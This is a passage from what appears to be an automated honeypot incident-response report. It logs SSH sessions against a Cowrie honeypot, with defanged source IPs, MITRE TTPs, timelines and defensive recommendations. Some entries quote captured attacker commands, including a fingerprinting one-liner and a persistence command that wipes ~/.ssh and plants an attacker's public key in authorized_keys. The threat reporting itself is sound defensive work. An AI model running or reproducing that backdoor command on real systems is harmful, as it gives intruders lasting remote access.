| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:56:48` | `cowrie.session.connect` |
| `2026-08-01 09:56:48` | `cowrie.client.version` |
| `2026-08-01 09:56:48` | `cowrie.client.kex` |
| `2026-08-01 09:56:50` | `cowrie.login.success` |
| `2026-08-01 09:56:52` | `cowrie.session.params` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.success` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.command.input` |
| `2026-08-01 09:56:52` | `cowrie.log.closed` |
| `2026-08-01 09:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6320b7f2c7d

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 10:00 |
| **Last Seen** | 2026-08-01 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:00:36` | `cowrie.session.connect` |
| `2026-08-01 10:00:36` | `cowrie.client.version` |
| `2026-08-01 10:00:36` | `cowrie.client.kex` |
| `2026-08-01 10:00:36` | `cowrie.login.success` |
| `2026-08-01 10:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57ab4d6ad6b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 10:02 |
| **Last Seen** | 2026-08-01 10:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:02:52` | `cowrie.session.connect` |
| `2026-08-01 10:02:52` | `cowrie.client.version` |
| `2026-08-01 10:02:55` | `cowrie.client.kex` |
| `2026-08-01 10:02:55` | `cowrie.login.success` |
| `2026-08-01 10:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deac4b9b829c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 10:02 |
| **Last Seen** | 2026-08-01 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:02:53` | `cowrie.session.connect` |
| `2026-08-01 10:02:53` | `cowrie.client.version` |
| `2026-08-01 10:02:53` | `cowrie.client.kex` |
| `2026-08-01 10:02:53` | `cowrie.login.success` |
| `2026-08-01 10:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b87bda590737

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 10:03 |
| **Last Seen** | 2026-08-01 10:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:03:03` | `cowrie.session.connect` |
| `2026-08-01 10:03:03` | `cowrie.client.version` |
| `2026-08-01 10:03:03` | `cowrie.client.kex` |
| `2026-08-01 10:03:04` | `cowrie.login.success` |
| `2026-08-01 10:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8ec014448a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 10:03 |
| **Last Seen** | 2026-08-01 10:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:03:04` | `cowrie.session.connect` |
| `2026-08-01 10:03:04` | `cowrie.client.version` |
| `2026-08-01 10:03:04` | `cowrie.client.kex` |
| `2026-08-01 10:03:04` | `cowrie.login.success` |
| `2026-08-01 10:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293483f27720

| Field | Detail |
|---|---|
| **Source IP** | `20.204.81[.]42` |
| **First Seen** | 2026-08-01 10:03 |
| **Last Seen** | 2026-08-01 10:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:03:38` | `cowrie.session.connect` |
| `2026-08-01 10:03:38` | `cowrie.client.version` |
| `2026-08-01 10:03:38` | `cowrie.client.kex` |
| `2026-08-01 10:03:39` | `cowrie.login.success` |
| `2026-08-01 10:03:40` | `cowrie.session.params` |
| `2026-08-01 10:03:40` | `cowrie.command.input` |
| `2026-08-01 10:03:40` | `cowrie.command.failed` |
| `2026-08-01 10:03:40` | `cowrie.log.closed` |
| `2026-08-01 10:03:41` | `cowrie.session.params` |
| `2026-08-01 10:03:41` | `cowrie.command.input` |
| `2026-08-01 10:03:41` | `cowrie.session.file_download` |
| `2026-08-01 10:03:41` | `cowrie.log.closed` |
| `2026-08-01 10:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.204.81[.]42` to AbuseIPDB if not already reported
- [ ] Block `20.204.81[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fdafe500031

| Field | Detail |
|---|---|
| **Source IP** | `20.204.81[.]42` |
| **First Seen** | 2026-08-01 10:03 |
| **Last Seen** | 2026-08-01 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:03:41` | `cowrie.session.connect` |
| `2026-08-01 10:03:41` | `cowrie.client.version` |
| `2026-08-01 10:03:42` | `cowrie.client.kex` |
| `2026-08-01 10:03:42` | `cowrie.login.success` |
| `2026-08-01 10:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.204.81[.]42` to AbuseIPDB if not already reported
- [ ] Block `20.204.81[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b41c475d0e

| Field | Detail |
|---|---|
| **Source IP** | `20.204.81[.]42` |
| **First Seen** | 2026-08-01 10:03 |
| **Last Seen** | 2026-08-01 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:03:43` | `cowrie.session.connect` |
| `2026-08-01 10:03:43` | `cowrie.client.version` |
| `2026-08-01 10:03:43` | `cowrie.client.kex` |
| `2026-08-01 10:03:44` | `cowrie.login.success` |
| `2026-08-01 10:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.204.81[.]42` to AbuseIPDB if not already reported
- [ ] Block `20.204.81[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e96a82f1a10

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-01 10:11 |
| **Last Seen** | 2026-08-01 10:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:11:22` | `cowrie.session.connect` |
| `2026-08-01 10:11:23` | `cowrie.client.version` |
| `2026-08-01 10:11:23` | `cowrie.client.kex` |
| `2026-08-01 10:11:25` | `cowrie.login.success` |
| `2026-08-01 10:11:25` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac85cb18312a

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 10:12 |
| **Last Seen** | 2026-08-01 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uptime` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:12:08` | `cowrie.session.connect` |
| `2026-08-01 10:12:08` | `cowrie.client.version` |
| `2026-08-01 10:12:08` | `cowrie.client.kex` |
| `2026-08-01 10:12:09` | `cowrie.login.success` |
| `2026-08-01 10:12:10` | `cowrie.session.params` |
| `2026-08-01 10:12:10` | `cowrie.command.input` |
| `2026-08-01 10:12:10` | `cowrie.log.closed` |
| `2026-08-01 10:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e4806f4ebe4

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]11` |
| **First Seen** | 2026-08-01 10:14 |
| **Last Seen** | 2026-08-01 10:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:14:14` | `cowrie.session.connect` |
| `2026-08-01 10:14:15` | `cowrie.client.version` |
| `2026-08-01 10:14:15` | `cowrie.client.kex` |
| `2026-08-01 10:14:18` | `cowrie.login.success` |
| `2026-08-01 10:14:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]11` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4fb466c8007

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-08-01 10:21 |
| **Last Seen** | 2026-08-01 10:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:21:09` | `cowrie.session.connect` |
| `2026-08-01 10:21:10` | `cowrie.client.version` |
| `2026-08-01 10:21:10` | `cowrie.client.kex` |
| `2026-08-01 10:21:12` | `cowrie.login.success` |
| `2026-08-01 10:21:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25dacd2b9771

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-08-01 10:21 |
| **Last Seen** | 2026-08-01 10:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:21:27` | `cowrie.session.connect` |
| `2026-08-01 10:21:28` | `cowrie.client.version` |
| `2026-08-01 10:21:28` | `cowrie.client.kex` |
| `2026-08-01 10:21:29` | `cowrie.login.success` |
| `2026-08-01 10:21:30` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f035ea54344

| Field | Detail |
|---|---|
| **Source IP** | `223.107.72[.]234` |
| **First Seen** | 2026-08-01 10:21 |
| **Last Seen** | 2026-08-01 10:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:21:35` | `cowrie.session.connect` |
| `2026-08-01 10:21:36` | `cowrie.client.version` |
| `2026-08-01 10:21:36` | `cowrie.client.kex` |
| `2026-08-01 10:21:38` | `cowrie.login.success` |
| `2026-08-01 10:21:40` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `223.107.72[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-449fba537bd2

| Field | Detail |
|---|---|
| **Source IP** | `20.192.5[.]254` |
| **First Seen** | 2026-08-01 10:26 |
| **Last Seen** | 2026-08-01 10:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:26:48` | `cowrie.session.connect` |
| `2026-08-01 10:26:49` | `cowrie.client.version` |
| `2026-08-01 10:26:49` | `cowrie.client.kex` |
| `2026-08-01 10:26:50` | `cowrie.login.success` |
| `2026-08-01 10:26:52` | `cowrie.session.params` |
| `2026-08-01 10:26:52` | `cowrie.command.input` |
| `2026-08-01 10:26:52` | `cowrie.command.failed` |
| `2026-08-01 10:26:53` | `cowrie.log.closed` |
| `2026-08-01 10:26:54` | `cowrie.session.params` |
| `2026-08-01 10:26:54` | `cowrie.command.input` |
| `2026-08-01 10:26:55` | `cowrie.session.file_download` |
| `2026-08-01 10:26:55` | `cowrie.log.closed` |
| `2026-08-01 10:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.192.5[.]254` to AbuseIPDB if not already reported
- [ ] Block `20.192.5[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1ca3b0de9b4

| Field | Detail |
|---|---|
| **Source IP** | `20.192.5[.]254` |
| **First Seen** | 2026-08-01 10:26 |
| **Last Seen** | 2026-08-01 10:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:26:55` | `cowrie.session.connect` |
| `2026-08-01 10:26:55` | `cowrie.client.version` |
| `2026-08-01 10:26:55` | `cowrie.client.kex` |
| `2026-08-01 10:26:56` | `cowrie.login.success` |
| `2026-08-01 10:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.192.5[.]254` to AbuseIPDB if not already reported
- [ ] Block `20.192.5[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f05977514c6

| Field | Detail |
|---|---|
| **Source IP** | `20.192.5[.]254` |
| **First Seen** | 2026-08-01 10:26 |
| **Last Seen** | 2026-08-01 10:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:26:57` | `cowrie.session.connect` |
| `2026-08-01 10:26:57` | `cowrie.client.version` |
| `2026-08-01 10:26:57` | `cowrie.client.kex` |
| `2026-08-01 10:27:00` | `cowrie.login.success` |
| `2026-08-01 10:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.192.5[.]254` to AbuseIPDB if not already reported
- [ ] Block `20.192.5[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e40d085e343

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 10:29 |
| **Last Seen** | 2026-08-01 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:29:16` | `cowrie.session.connect` |
| `2026-08-01 10:29:16` | `cowrie.client.version` |
| `2026-08-01 10:29:16` | `cowrie.client.kex` |
| `2026-08-01 10:29:16` | `cowrie.login.success` |
| `2026-08-01 10:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ace92eb84ca

| Field | Detail |
|---|---|
| **Source IP** | `36.135.62[.]103` |
| **First Seen** | 2026-08-01 10:46 |
| **Last Seen** | 2026-08-01 10:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:46:22` | `cowrie.session.connect` |
| `2026-08-01 10:46:23` | `cowrie.client.version` |
| `2026-08-01 10:46:23` | `cowrie.client.kex` |
| `2026-08-01 10:46:29` | `cowrie.login.success` |
| `2026-08-01 10:46:29` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.135.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `36.135.62[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a339be953679

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-08-01 10:46 |
| **Last Seen** | 2026-08-01 10:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:46:35` | `cowrie.session.connect` |
| `2026-08-01 10:46:36` | `cowrie.client.version` |
| `2026-08-01 10:46:36` | `cowrie.client.kex` |
| `2026-08-01 10:46:38` | `cowrie.login.success` |
| `2026-08-01 10:46:39` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb845595bac8

| Field | Detail |
|---|---|
| **Source IP** | `65.181.79[.]60` |
| **First Seen** | 2026-08-01 10:54 |
| **Last Seen** | 2026-08-01 10:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:54:34` | `cowrie.session.connect` |
| `2026-08-01 10:54:36` | `cowrie.client.version` |
| `2026-08-01 10:54:36` | `cowrie.client.kex` |
| `2026-08-01 10:54:39` | `cowrie.login.success` |
| `2026-08-01 10:54:39` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.79[.]60` to AbuseIPDB if not already reported
- [ ] Block `65.181.79[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eea5b680149d

| Field | Detail |
|---|---|
| **Source IP** | `203.129.225[.]4` |
| **First Seen** | 2026-08-01 10:54 |
| **Last Seen** | 2026-08-01 10:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:54:45` | `cowrie.session.connect` |
| `2026-08-01 10:54:46` | `cowrie.client.version` |
| `2026-08-01 10:54:46` | `cowrie.client.kex` |
| `2026-08-01 10:54:48` | `cowrie.login.success` |
| `2026-08-01 10:54:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.225[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.129.225[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28632afa4b37

| Field | Detail |
|---|---|
| **Source IP** | `223.197.145[.]33` |
| **First Seen** | 2026-08-01 10:56 |
| **Last Seen** | 2026-08-01 10:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:56:06` | `cowrie.session.connect` |
| `2026-08-01 10:56:07` | `cowrie.client.version` |
| `2026-08-01 10:56:07` | `cowrie.client.kex` |
| `2026-08-01 10:56:09` | `cowrie.login.success` |
| `2026-08-01 10:56:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.145[.]33` to AbuseIPDB if not already reported
- [ ] Block `223.197.145[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b9a349ccd3

| Field | Detail |
|---|---|
| **Source IP** | `186.23.209[.]47` |
| **First Seen** | 2026-08-01 10:56 |
| **Last Seen** | 2026-08-01 10:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:56:19` | `cowrie.session.connect` |
| `2026-08-01 10:56:20` | `cowrie.client.version` |
| `2026-08-01 10:56:20` | `cowrie.client.kex` |
